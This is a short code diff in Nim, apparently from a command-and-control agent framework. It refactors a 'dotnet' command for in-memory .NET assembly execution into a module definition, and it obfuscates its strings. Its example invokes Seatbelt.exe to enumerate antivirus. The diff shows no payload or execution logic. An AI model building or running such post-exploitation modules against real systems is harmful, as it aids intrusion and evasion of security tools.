@@ -3,20 +3,24 @@ import ../common/[types, utils]
 # Define function prototype
 proc executeAssembly(ctx: AgentCtx, task: Task): TaskResult 
 
-# Command definition (as seq[Command])
-let commands*: seq[Command] =  @[
-    Command(
-        name: protect("dotnet"),
-        commandType: CMD_DOTNET,
-        description: protect("Execute a .NET assembly in memory and retrieve the output."),
-        example: protect("dotnet /path/to/Seatbelt.exe antivirus"),
-        arguments: @[
-            Argument(name: protect("path"), description: protect("Path to the .NET assembly file to execute."), argumentType: BINARY, isRequired: true),
-            Argument(name: protect("arguments"), description: protect("Arguments to be passed to the assembly. Arguments are handled as STRING"), argumentType: STRING, isRequired: false)
-        ],
-        execute: executeAssembly
-    )
-]
+# Module definition
+let module* = Module(
+    name: protect("dotnet"), 
+    description: protect("Load and execute .NET assemblies in memory."),
+    commands: @[
+        Command(
+            name: protect("dotnet"),
+            commandType: CMD_DOTNET,
+            description: protect("Execute a .NET assembly in memory and retrieve the output."),
+            example: protect("dotnet /path/to/Seatbelt.exe antivirus"),
+            arguments: @[
+                Argument(name: protect("path"), description: protect("Path to the .NET assembly file to execute."), argumentType: BINARY, isRequired: true),
+                Argument(name: protect("arguments"), description: protect("Arguments to be passed to the assembly. Arguments are handled as STRING"), argumentType: STRING, isRequired: false)
+            ],
+            execute: executeAssembly
+        )
+    ]
+)
 
 # Implement execution functions
 when defined(server):
